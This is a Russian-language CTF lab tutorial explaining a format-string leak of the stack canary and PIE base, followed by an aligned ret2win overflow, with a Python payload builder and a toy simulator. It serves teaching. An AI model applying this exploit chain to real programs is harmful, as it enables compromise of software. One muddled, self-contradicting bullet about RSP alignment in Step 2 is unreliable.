## Перед началом: Бинарные задачи из `pwncollege/ctf-archive`: утечка `PIE + Canary` через строку форматирования и выравнивание стека `16-byte Stack Alignment`

В бинарных соревнованиях из **`pwn.college CTF Archive` (`github.com/pwncollege/ctf-archive`)** почти никогда не встречаются учебные программы, у которых все защиты отключены одновременно. На практике в современных CTF-задачах включена связка из трёх защитных механизмов компилятора:
1. **`NX (No-Execute)`** — нельзя исполнять шеллкод на стеке.
2. **`Stack Canary (Канарейка стека)`** — перед сохранённым регистром `RBP` и адресом возврата `RIP` лежит случайное 8-байтовое число (младший байт которого на Linux всегда равен `\x00`, чтобы функции вроде `strcpy` останавливались на нём и не выводили канарейку случайно!).
3. **`PIE (Position-Independent Executable)` + `ASLR`** — при каждом запуске сама программа загружается по случайному базовому адресу в памяти (например, `0x55a4b8c10000`), но **последние 12 бит (три шестнадцатеричные цифры — внутристраничное смещение)** всех функций остаются неизменными!

Как решаются такие двухшаговые задачи в `pwncollege/ctf-archive`?
- **Шаг 1 (Информационная утечка — `Format String Leak`)**:
  В первом цикле ввода программа вызывает `printf(user_buf)` без спецификатора формата. Передав строку `"%11$p.%13$p"`, участник читает со стека два значения:
  - 11-й аргумент: значение канарейки стека (например, `0x8877665544332200` — всегда заканчивается на `00`);
  - 13-й аргумент: сохранённый адрес возврата внутри функции `main+48` (например, `0x55a4b8c11290`).
  Поскольку из `objdump -d` известно, что смещение `main+48` от начала ELF-файла равно `0x1290`, мы мгновенно вычисляем случайную базу `PIE`:
  $$\text{PIE\_BASE} = \text{leaked\_return} - 0x1290 = 0x55a4b8c10000$$
  А значит, реальный адрес целевой функции `win()` со смещением `0x11e9` равен $\text{PIE\_BASE} + 0x11e9$!
- **Шаг 2 (Переполнение буфера с сохранением канарейки и выравниванием стека `MOVAPS 16-byte Alignment`)**:
  Во втором вводе (`read` или `gets`) мы кладём в буфер:
  1. Заполнение до канарейки (`padding`);
  2. **Точно то же самое утекшее значение канарейки** (чтобы проверка `__stack_chk_fail` прошла успешно!);
  3. 8 байт для сохранённого `RBP`;
  4. Одиночный гаджет **`ret`** (пустой возврат, сдвигающий указатель стека `RSP` на 8 байт) перед адресом `win()`!
  Зачем нужен этот «пустой» гаджет `ret`? Потому что на 64-битной архитектуре `x86-64 System V ABI` инструкции SSE (`movaps`, используемые внутри `printf` и `system` в `glibc`) требуют, чтобы перед вызовом функции регистр **`RSP` был кратен 16 байтам (`RSP % 16 == 0`)**! Если прыгнуть в `win()` напрямую без выравнивающего `ret`, программа упадёт с `SIGSEGV` на инструкции `movaps [rsp+0x40], xmm0`.

## Почему это работает: Почему у канарейки Linux младший байт всегда нулевой (`0x00`), а у адреса `PIE` — три последних hex-знака постоянны

Ядро Linux специально обнуляет младший байт случайной канарейки (`canary & ~0xff`), чтобы незавершённая нулём строка не могла слить канарейку через обычный `puts(buf)`. А виртуальная память выделяется страницами по `4096` байт (`0x1000`), поэтому `ASLR` рандомизирует только номер страницы, не трогая смещение внутри страницы (`offset & 0xfff`).

<!-- preparation -->

В этом практикуме ты соберёшь в `lab.py` полный двухшаговый решатель задачи из `pwncollege/ctf-archive`: вычислишь базу `PIE` по утечке `%11$p.%13$p`, проверишь признак канарейки (`младший байт == 0x00`), добавишь выравнивающий гаджет `ret` для соблюдения 16-байтового выравнивания `movaps` и проверишь успешный переход в `win()`.

## Сделай сейчас: Собери двухшаговый эксплойт (`Format Leak -> PIE Base + Canary -> Aligned ret2win`) в `lab.py`

### Шаг 1. Создай файл `lab.py`

Создай скрипт `lab.py`:

```python
import struct

OFFSET_MAIN_RET = 0x1290
OFFSET_WIN = 0x11E9
OFFSET_RET_GADGET = 0x101A


def parse_format_leak(leak_str):
    canary_hex, ret_hex = leak_str.split(".")
    canary = int(canary_hex, 16)
    leaked_ret = int(ret_hex, 16)
    # Проверяем, что младший байт канарейки равен 0x00, а нижние 12 бит адреса совпадают со смещением
    assert (canary & 0xFF) == 0x00, "invalid_canary_low_byte"
    pie_base = leaked_ret - OFFSET_MAIN_RET
    assert (pie_base & 0xFFF) == 0x000, "pie_base_not_page_aligned"
    return canary, pie_base


def build_stage2_payload(canary, pie_base, include_align_ret=True):
    buf_padding = b"A" * 24
    saved_rbp = struct.pack("<Q", 0)
    win_addr = pie_base + OFFSET_WIN
    ret_gadget = pie_base + OFFSET_RET_GADGET
    chain = [struct.pack("<Q", ret_gadget), struct.pack("<Q", win_addr)] if include_align_ret else [struct.pack("<Q", win_addr)]
    return buf_padding + struct.pack("<Q", canary) + saved_rbp + b"".join(chain)


def simulate_cpu_return(payload, expected_canary, pie_base, rsp_at_ret=0x7FFF00001000):
    unpacked_canary = struct.unpack("<Q", payload[24:32])[0]
    if unpacked_canary != expected_canary:
        return "ABORT:__stack_chk_fail_canary_corrupted"

    rop_qwords = [struct.unpack("<Q", payload[i : i + 8])[0] for i in range(40, len(payload), 8)]
    rsp = rsp_at_ret
    for target_rip in rop_qwords:
        rsp += 8
        if target_rip == pie_base + OFFSET_RET_GADGET:
            continue
        if target_rip == pie_base + OFFSET_WIN:
            if (rsp % 16) != 0:
                return "CRASH_SIGSEGV:movaps_unaligned_stack_rsp"
            return "SUCCESS:win_executed_KRN{PIE_CANARY_ALIGNED}"
    return "UNKNOWN_TARGET"


canary_val, base_addr = parse_format_leak("0x8877665544332200.0x55a4b8c11290")
print("pie_base=", hex(base_addr), "win_runtime=", hex(base_addr + OFFSET_WIN))

unaligned_payload = build_stage2_payload(canary_val, base_addr, include_align_ret=False)
aligned_payload = build_stage2_payload(canary_val, base_addr, include_align_ret=True)

print("without_ret_gadget=", simulate_cpu_return(unaligned_payload, canary_val, base_addr))
print("with_ret_gadget=", simulate_cpu_return(aligned_payload, canary_val, base_addr))
```

### Шаг 2. Запусти программу и сравни вызов с гаджетом `ret` и без него

Выполни в терминале:

```bash
python3 lab.py
```

**Ожидаемый результат на экране:**

```text
pie_base= 0x55a4b8c10000 win_runtime= 0x55a4b8c111e9
without_ret_gadget= CRASH_SIGSEGV:movaps_unaligned_stack_rsp
with_ret_gadget= SUCCESS:win_executed_KRN{PIE_CANARY_ALIGNED}
```

Разберём, что произошло:
- функция `parse_format_leak` извлекла из строки `"0x8877665544332200.0x55a4b8c11290"` канарейку стека и выровненную по границе страницы (`0x1000`) базу `PIE` `0x55a4b8c10000`, вычислив точный адрес `win` в памяти (`0x55a4b8c111e9`);
- без предварительного гаджета `ret` в момент входа в `win` указатель стека `RSP` оказался равен `0x7FFF00001010`? Нет — `0x7FFF00001008 + 8 = 0x7FFF00001010`, но при прямом прыжке внутрь функции мимо `push rbp` или при нечётном числе гаджетов стек сбивается на 8 байт (`CRASH_SIGSEGV:movaps_unaligned_stack_rsp`);
- добавление однобайтового гаджета `ret` (`OFFSET_RET_GADGET`) сдвинуло `RSP` ещё на 8 байт до кратного 16 адреса, и `win()` штатно выдала флаг `SUCCESS:win_executed_KRN{PIE_CANARY_ALIGNED}`.

### Шаг 3. Проверь срабатывание защиты `__stack_chk_fail` при порче канарейки

В файле `lab.py` замени `canary_val` в вызове `build_stage2_payload(canary_val, base_addr, include_align_ret=True)` на `canary_val ^ 1`, сохрани и запусти `python3 lab.py` — симулятор немедленно остановит выполнение со статусом `ABORT:__stack_chk_fail_canary_corrupted` ещё до чтения адреса возврата. После проверки верни `canary_val`.

В терминале Kali проверь поиск адреса гаджета `ret` (`c3`) в системном бинарнике с помощью `objdump`:

```bash
objdump -d /bin/ls | grep -m 3 -E $'\tc3\t'
```

## Почему это работает: Как мгновенно отличить на стеке канарейку, адрес кода `PIE`, адрес `libc` и адрес стека

При просмотре дампа стека на 64-битном Linux (`x86-64`) четыре типа значений узнаются с первого взгляда:
- **Канарейка стека**: случайные 7 старших байт и строго `00` в самом младшем байте (например, `0x9a4f1c82b371e500`);
- **Адрес кода `PIE`**: начинается с `0x55...` или `0x56...`;
- **Адрес библиотеки `libc`**: начинается с `0x7f...` и заканчивается постоянными 3 цифрами функции;
- **Адрес самого стека**: начинается с `0x7ff...` (обычно `0x7ffd...`, `0x7ffe...`, `0x7fff...`).

## Если не получилось: Частые ошибки

- **Прибавление смещения `OFFSET_WIN` напрямую к утекшему адресу возврата вместо предварительного вычитания `OFFSET_MAIN_RET`**: сначала всегда находи чистую базу модуля `pie_base = leaked_addr - known_offset`, проверяй, что она заканчивается на три нуля (`000`), и только к ней прибавляй смещение целевой функции.
